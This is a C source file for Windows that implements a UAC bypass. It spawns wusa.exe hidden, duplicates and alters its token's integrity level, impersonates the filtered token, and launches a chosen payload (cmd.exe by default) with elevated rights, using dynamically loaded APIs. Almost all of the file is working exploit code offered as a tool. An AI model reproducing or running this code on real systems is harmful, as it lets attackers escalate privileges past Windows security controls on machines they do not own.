#include <Windows.h>
#include <stdio.h>

#include "LoadAPI.h"


HANDLE getHanbleWUSA(Shell32_API Shell32Api) {
	SHELLEXECUTEINFO eWusa;

	memset(&eWusa, 0, sizeof(SHELLEXECUTEINFO));
	eWusa.cbSize = sizeof(eWusa);
	eWusa.fMask = SEE_MASK_NOCLOSEPROCESS;
	eWusa.lpFile = "wusa.exe";
	eWusa.nShow = SW_HIDE;

	if (!Shell32Api.ShellExecuteExAF(&eWusa))
		return NULL;

	return eWusa.hProcess;
}

BOOL UACBypass(API_Call apiStruct, LPCWSTR lpPayload){
	HANDLE hProcess;
	HANDLE hToken;
	HANDLE hNewToken;
	HANDLE pSID;
	HANDLE lToken;
	
	SID_IDENTIFIER_AUTHORITY sSIA = SECURITY_MANDATORY_LABEL_AUTHORITY;
	SID_AND_ATTRIBUTES sSAA;
	TOKEN_MANDATORY_LABEL sTML;
	STARTUPINFO sStartInfo;
	PROCESS_INFORMATION sProcessInfo;

	Kernel32_API  Kernel32Api = apiStruct.Kernel32Api;
	Advapi32_API Advapi32Api = apiStruct.Advapi32Api;
	Shell32_API Shell32Api = apiStruct.Shell32Api;
	ntdll_API ntdllApi = apiStruct.ntdllApi;



	hProcess = getHanbleWUSA(Shell32Api);
	if(hProcess == NULL) {
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	if (!Advapi32Api.OpenProcessTokenF(hProcess, MAXIMUM_ALLOWED, &hToken)){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	if (!Advapi32Api.DuplicateTokenExF(hToken, 0xf01ff, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken)){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	if (!Advapi32Api.AllocateAndInitializeSidF(&sSIA, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, &pSID)){  ///// // FreeSid 
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}
	sSAA.Sid = pSID;
	sSAA.Attributes = SE_GROUP_INTEGRITY;
	sTML.Label = sSAA;

	if (ntdllApi.NtSetInformationTokenF(hNewToken, TokenIntegrityLevel, &sTML, sizeof(TOKEN_MANDATORY_LABEL)) != 0){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		// FreeSid 
		return FALSE;
	}
	if (ntdllApi.NtFilterTokenF(hNewToken, 4, NULL, NULL, NULL, &lToken) != 0){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	hNewToken = NULL;
	if (!Advapi32Api.DuplicateTokenExF(lToken, 0xc, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken)){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	if (!Advapi32Api.ImpersonateLoggedOnUserF(hNewToken)){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	memset(&sStartInfo, 0, sizeof(STARTUPINFO));
	sStartInfo.dwFlags = STARTF_USESHOWWINDOW;
	sStartInfo.wShowWindow = SW_NORMAL; // SW_HIDE
	sStartInfo.cb = sizeof(STARTUPINFO);
	memset(&sProcessInfo, 0, sizeof(PROCESS_INFORMATION));

	if (!Advapi32Api.CreateProcessWithLogonWF(L"aaa", L"bbb", L"ccc", LOGON_NETCREDENTIALS_ONLY, lpPayload, NULL,CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &sStartInfo, &sProcessInfo)){
		Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
		return FALSE;
	}

	Kernel32Api.TerminateProcessF(hProcess, ERROR_SUCCESS);
	return TRUE;
}



BOOL IsWindowsVistaOrGreater(){
	OSVERSIONINFOEXW osvi = { sizeof(osvi), 0, 0, 0, 0, {0}, 0, 0 };
	DWORDLONG        const dwlConditionMask = VerSetConditionMask(
		VerSetConditionMask(
			VerSetConditionMask(0, VER_MAJORVERSION, VER_GREATER_EQUAL),
			VER_MINORVERSION, VER_GREATER_EQUAL),
			VER_SERVICEPACKMAJOR, VER_GREATER_EQUAL);

	osvi.dwMajorVersion = HIBYTE(_WIN32_WINNT_VISTA);
	osvi.dwMinorVersion = LOBYTE(_WIN32_WINNT_VISTA);
	osvi.wServicePackMajor = 0;

	return VerifyVersionInfoW(&osvi, VER_MAJORVERSION | VER_MINORVERSION | VER_SERVICEPACKMAJOR, dwlConditionMask) != FALSE;
}




BOOL IsRunAsAdmin(Advapi32_API Advapi32Api){
	BOOL  fIsRunAsAdmin = FALSE;
	PSID  pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (Advapi32Api.AllocateAndInitializeSidF(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)){
		if (!Advapi32Api.CheckTokenMembershipF(NULL, pAdministratorsGroup, &fIsRunAsAdmin)) {
			Advapi32Api.FreeSidF(pAdministratorsGroup);
			return fIsRunAsAdmin;
		}
		FreeSid(pAdministratorsGroup);
	}
	return fIsRunAsAdmin;
}

BOOL IsUserInAdminGroup(Advapi32_API Advapi32Api){
	BOOL   fInAdminGroup = FALSE;
	DWORD  dwError = ERROR_SUCCESS;
	HANDLE hToken = NULL;
	HANDLE hTokenToCheck = NULL;
	DWORD  cbSize = 0;

	if (!Advapi32Api.OpenProcessTokenF(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)){
		dwError = GetLastError();
		goto Cleanup;
	}

	if (IsWindowsVistaOrGreater()){
		TOKEN_ELEVATION_TYPE elevType;
		if (!Advapi32Api.GetTokenInformationF(hToken, TokenElevationType, &elevType, sizeof(elevType), &cbSize)){
			dwError = GetLastError();
			goto Cleanup;
		}
		if (TokenElevationTypeLimited == elevType){
			if (!Advapi32Api.GetTokenInformationF(hToken, TokenLinkedToken, &hTokenToCheck, sizeof(hTokenToCheck), &cbSize)){
				dwError = GetLastError();
				goto Cleanup;
			}
		}
	}
	if (!hTokenToCheck){
		if (!Advapi32Api.DuplicateTokenF(hToken, SecurityIdentification, &hTokenToCheck)){
			dwError = GetLastError();
			goto Cleanup;
		}
	}

	BYTE adminSID[SECURITY_MAX_SID_SIZE];
	cbSize = sizeof(adminSID);
	if (!Advapi32Api.CreateWellKnownSidF(WinBuiltinAdministratorsSid, NULL, &adminSID, &cbSize)){
		dwError = GetLastError();
		goto Cleanup;
	}

	if (!Advapi32Api.CheckTokenMembershipF(hTokenToCheck, &adminSID, &fInAdminGroup)){
		dwError = GetLastError();
		goto Cleanup;
	}

Cleanup:
	if (hToken){
		CloseHandle(hToken);
		hToken = NULL;
	}
	if (hTokenToCheck){
		CloseHandle(hTokenToCheck);
		hTokenToCheck = NULL;
	}

	if (ERROR_SUCCESS != dwError){
		printf("Fail %i\n", dwError);
		return FALSE;
	}

	return fInAdminGroup;
}

//typedef BOOL(WINAPI *IsWindowsVistaOrGreater_gertetr)(VOID);


//int main(int argc, char* argv[]) {
int	wmain(int argc, wchar_t *argv[]){
	API_Call apiStruct;

	LPWSTR programToRun;

	if (argc == 1)
		programToRun = L"C:\\Windows\\System32\\cmd.exe";
	else if (argc == 2) {
		/*int argSize = strlen(argv[1]);
		wchar_t wtext = (wchar_t)calloc(argSize + 1, sizeof(wchar_t));
		if (wtext == NULL)
			return FALSE;
		mbstowcs_s(sizeof(wchar_t),wtext, argSize, argv[1], argSize + 1);*/
		//programToRun = wtext;
	
		programToRun = argv[1];
	
	}else
		return FALSE;


	if (!loadApi(&apiStruct)) {
		printf("Fail to load api\n");
		return FALSE;
	}

	if (IsRunAsAdmin(apiStruct.Advapi32Api)) {
		printf("[i] Is admin :)\n");
	}else {
		printf("[i] Process not running with admin priv\n");
		if (IsUserInAdminGroup(apiStruct.Advapi32Api)) {
			printf("[i] User is in the admin group\n");
			if (UACBypass(apiStruct, programToRun)) {
				printf("[OK] UAC Bypass worked\n");
			}else{
				printf("[X] UAC Bypass failed\n");
			}
		}else {
			printf("[X] User is no in the admin group !\n");
		}
	}
	system("pause");

	return TRUE;
}